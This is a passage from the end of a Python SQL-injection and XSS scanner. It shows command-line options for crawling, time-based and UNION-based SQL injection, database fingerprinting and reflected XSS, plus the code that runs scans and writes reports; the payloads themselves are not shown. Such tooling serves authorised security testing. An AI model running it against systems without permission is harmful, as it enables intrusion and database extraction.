            seen.add(u)

    log(f"[*] Crawling finished: discovered {len(unique)} URLs")
    return unique


       

def build_argparser():
    parser = argparse.ArgumentParser(description="MVP SQLi/XSS scanner - Phases 1–4 + UNION + Context-Aware XSS + Advanced Reflected XSS")
    group = parser.add_mutually_exclusive_group(required=True)
    group.add_argument("--url", "-u", help="Base target URL to scan (can be combined with --crawl)")
    group.add_argument("--file", help="File with list of target URLs (one per line)")

    parser.add_argument("--method", "-m", choices=["GET","POST"], default="GET", help="HTTP method (default GET)")
    parser.add_argument("--postdata", default=None, help="POST data as key=value&k2=v2")
    parser.add_argument("--json", default=None, help='POST JSON body as a JSON string, e.g. \'{\"q\":\"test\"}\'')
    parser.add_argument("--headers", default=None, help="Extra headers as key1:val1|key2:val2")
    parser.add_argument('--timeout', type=int, default=10, help='Request timeout seconds')
    parser.add_argument('--verbose', action='store_true', help='Verbose output')
    parser.add_argument('--headers-inject', action='store_true', help='Try payloads in headers (User-Agent, Referer, X-Forwarded-For)')
    parser.add_argument('--inject-all-params', dest='inject_all_params', action='store_true', help='Inject payloads into all parameters of a request')
    parser.add_argument('--payloads', type=str, help='Path to payload file (one payload per line). If omitted, uses built-in lists.')
    # (5) ملف JSON مُصنَّف
    parser.add_argument('--payloads-json', type=str, help='Path to JSON payload categories (keys: boolean,time,error,xss)')
    parser.add_argument('--report-json', default='report.json', help='Path to structured JSON report')
    parser.add_argument('--report-txt', default='report.txt', help='Path to human-readable report')

    # Phase 3 flags:
    parser.add_argument('--threads', type=int, default=1, help='Concurrency: worker threads (>=1). Applies inside each target.')
    parser.add_argument('--delay', type=float, default=0.0, help='Global delay (seconds) between requests for throttling')
    parser.add_argument('--auto-verify', action='store_true', help='Run simple auto-verification (SQLi boolean, XSS token reflect)')

    # Phase 4 tuning:
    parser.add_argument('--len-threshold', type=float, default=0.30, help='Length diff threshold for heuristics (default 0.30)')

    # --- New crawling flags ---
    parser.add_argument('--crawl', action='store_true', help='Enable crawling starting from the base URL (only with --url)')
    parser.add_argument('--crawl-depth', type=int, default=2, help='Maximum crawl depth (default: 2)')
    parser.add_argument('--max-pages', type=int, default=100, help='Maximum number of pages to crawl (default: 100)')
    parser.add_argument('--save-discovered', action='store_true', help='Save discovered URLs from crawling to discovered_urls.txt')

    # --- Phase 2: Time-based SQLi flags ---
    parser.add_argument('--time-sqli', action='store_true', help='Enable time-based SQL injection detection')
    parser.add_argument('--time-delay', type=int, default=5, help='Time-based payload delay in seconds (default: 5)')
    parser.add_argument('--time-threshold', type=float, default=4.0, help='Extra seconds over baseline to treat as time-based SQLi (default: 4.0)')
    parser.add_argument('--time-samples', type=int, default=3, help='Number of samples per baseline/payload timing (default: 3)')

    # --- Phase 3b: UNION-based extraction flags ---
    parser.add_argument('--union-extract', action='store_true',
                        help='Attempt UNION-based SQLi extraction (db version/user/database) on vulnerable-looking params')

    # --- Phase 8: Context-aware XSS flag ---
    parser.add_argument('--xss-context', action='store_true',
                        help='Enable Phase 8 context-aware XSS detection (HTML/attribute/JS aware payloads)')

    # --- NEW: Active DBMS fingerprinting flag ---
    parser.add_argument('--active-fp', action='store_true',
                        help='Enable active DBMS fingerprinting (send breaking payloads and analyze DB errors)')

    # --- Phase 9: Advanced reflected XSS flag ---
    parser.add_argument('--xss-advanced', action='store_true',
                        help='Enable Phase 9 advanced reflected XSS scanning (smart reflection & injection location mapping)')

    return parser

def dedupe_findings(findings):
    """
    إزالة التكرارات البسيطة: نفس (url, injected_param, payload, vuln_type)
    """
    seen = set()
    uniq = []
    for f in findings:
        key = (
            f.get("url"),
            f.get("injected_param"),
            f.get("payload"),
            f.get("vuln_type")
        )
        if key in seen:
            continue
        seen.add(key)
        uniq.append(f)
    return uniq

def main():
    global TIMEOUT, REPORT_FILE, REPORT_JSON, AUTO_VERIFY, RATE_LIMITER, LENGTH_DIFF_THRESHOLD
    parser = build_argparser()
    args = parser.parse_args()

    TIMEOUT = int(args.timeout)
    REPORT_FILE = args.report_txt
    REPORT_JSON = args.report_json
    AUTO_VERIFY = bool(args.auto_verify)
    RATE_LIMITER = RateLimiter(args.delay or 0.0)
    LENGTH_DIFF_THRESHOLD = float(args.len_threshold if args.len_threshold is not None else 0.30)

    # prepare headers
    hdrs = {}
    if args.headers:
        for kv in args.headers.split("|"):
            if ":" in kv:
                k, v = kv.split(":", 1)
                hdrs[k.strip()] = v.strip()

    # payloads loading
    combined_payloads = None
    payloads_categories = None
    if args.payloads:
        pl = load_payloads_file(args.payloads)
        if pl:
            combined_payloads = pl
            log(f"[*] Loaded {len(pl)} payloads from {args.payloads}")
    if args.payloads_json and not combined_payloads:
        payloads_categories = load_payloads_json(args.payloads_json)
        if payloads_categories:
            flat_count = sum(len(v) for v in payloads_categories.values())
            log(f"[*] Loaded categorized payloads ({flat_count}) from {args.payloads_json}")

    # clear report files
    open(REPORT_FILE, "w", encoding="utf-8").close()

    # targets
    targets = []
    if args.url:
        if args.crawl:
            # Crawl starting from base URL (يستخدم نفس الهيدرز/الكوكيز)
            targets = crawl_site(args.url, max_depth=args.crawl_depth, max_pages=args.max_pages, headers=hdrs)
            # لو حاب تحفظ الروابط المكتشفة
            if args.save_discovered and targets:
                try:
                    with open("discovered_urls.txt", "w", encoding="utf-8") as f:
                        for u in targets:
                            f.write(u + "\n")
                    log("[*] Discovered URLs saved to discovered_urls.txt")
                except Exception as e:
                    log(f"[ERROR] Could not save discovered URLs: {e}")
        else:
            targets = [args.url]
    else:
        # file-based targets (optional)
        targets = load_targets_from_file(args.file)

    if not targets:
        log("[!] No targets to scan (empty list).")
        return

    all_findings = []
    start = time.time()

    # Concurrency across targets too
    if args.threads and args.threads > 1 and len(targets) > 1:
        with ThreadPoolExecutor(max_workers=args.threads) as ex:
            futs = []
            for t in targets:
                futs.append(ex.submit(
                    scan_target, t, method=args.method, postdata_str=args.postdata, headers=hdrs, json_str=args.json,
                    headers_inject=args.headers_inject, inject_all_params_flag=args.inject_all_params,
                    combined_payloads=combined_payloads, verbose=args.verbose, threads=args.threads,
                    payloads_categories=payloads_categories,
                    time_sqli=args.time_sqli, time_delay=args.time_delay,
                    time_threshold=args.time_threshold, time_samples=args.time_samples,
                    union_extract=args.union_extract,
                    xss_context=args.xss_context,
                    active_fp=args.active_fp,
                    xss_advanced=args.xss_advanced
                ))
            for f in as_completed(futs):
                try:
                    all_findings.extend(f.result() or [])
                except KeyboardInterrupt:
                    log("Interrupted by user")
                    break
                except Exception as e:
                    log(f"[DEBUG] target error: {e}")
    else:
        for t in targets:
            try:
                f = scan_target(
                    t, method=args.method, postdata_str=args.postdata, headers=hdrs, json_str=args.json,
                    headers_inject=args.headers_inject, inject_all_params_flag=args.inject_all_params,
                    combined_payloads=combined_payloads, verbose=args.verbose, threads=args.threads,
                    payloads_categories=payloads_categories,
                    time_sqli=args.time_sqli, time_delay=args.time_delay,
                    time_threshold=args.time_threshold, time_samples=args.time_samples,
                    union_extract=args.union_extract,
                    xss_context=args.xss_context,
                    active_fp=args.active_fp,
                    xss_advanced=args.xss_advanced
                )
                all_findings.extend(f)
            except KeyboardInterrupt:
                print("Interrupted by user")
                break

    # إزالة التكرارات (مهم بعد إضافة Phase 8 + Phase 9)
    all_findings = dedupe_findings(all_findings)

    elapsed = time.time() - start
    log(f"Scan finished in {elapsed:.2f}s. Findings: {len(all_findings)}")

    # write structured JSON report
    try:
        with open(REPORT_JSON, "w", encoding="utf-8") as jf:
            _json.dump({
                "generated_at": now_ts(),
                "targets_scanned": len(targets),
                "findings_count": len(all_findings),
                "findings": all_findings
            }, jf, indent=2, ensure_ascii=False)
        if all_findings:
            log(f"Structured JSON report saved to {REPORT_JSON}")
    except Exception as e:
        log(f"[ERROR] Could not write JSON report: {e}")

if __name__ == "__main__":
    main()

